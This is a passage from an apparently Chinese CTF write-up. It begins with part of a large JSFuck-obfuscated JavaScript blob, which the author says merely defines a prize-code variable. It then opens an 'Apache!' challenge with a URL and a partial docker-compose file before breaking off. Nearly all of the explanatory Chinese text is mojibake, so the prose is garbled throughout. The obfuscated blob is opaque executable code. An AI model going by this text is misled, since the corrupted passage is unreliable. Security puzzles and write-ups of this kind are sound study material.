)[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(!![]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[+!+[]]+[!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]())[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[!+[]+!+[]]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+[!+[]+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+[]]+(![]+[])[+!+[]]+[!+[]+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])()) ç„¶è€Œç›´æ¥æ‰§è¡Œå‘ç°æ˜¯ undefined æœ€åå‘ç°å‰é¢è¿™æ®µæ˜¯ evalï¼Œåé¢å®šä¹‰äº†ä¸ªå‡½æ•° å…¶å®å°±æ˜¯å®šä¹‰äº†ä¸ªå˜é‡ï¼ˆ var r3d_CodE = \"h2g0a2m2e\" å¯æƒœè¢«æŠ¢å®Œäº†ï¼Œå¯æ¶ï¼ï¼ï¼ æ²¡äº‹å•¦ï¼Œè™å¹´å¿«ä¹å•¦~ ç„¶ååœ¨æƒ³ï¼Œé¢„æœŸè§£æ˜¯ä¸æ˜¯è¯»å–ç¯å¢ƒé‡Œå®šä¹‰çš„å˜é‡åˆ—è¡¨ç„¶åå»è¯»å˜é‡å‘¢ï¼Ÿ Apache! Description Ooops,Summ3r çš„æœºå™¨è¢«å¤§é»‘é˜”æ‰“ç©¿äº†ï¼ä¸è¿‡è¿˜å¥½ Summ3r æœ‰å¤‡ä»½çš„ä¹ æƒ¯ï¼ŒæŠŠ flag å¤‡ä»½åœ¨äº†å†…ç½‘çš„æŸå°æœºå™¨ä¸Šé¢ï¼Œå˜¿å˜¿å˜¿ã€‚ã€‚ã€‚ Challenge Address http://httpd.summ3r.top:60010 /www.zip æºç  docker-compose.yml version: \"3.8\" services: apache: image: httpd:2.4.48-alpine volumes: - ./static:/usr/local/apache2/htdocs - ./httpd.conf:/usr/local/apache2/conf/httpd.conf - 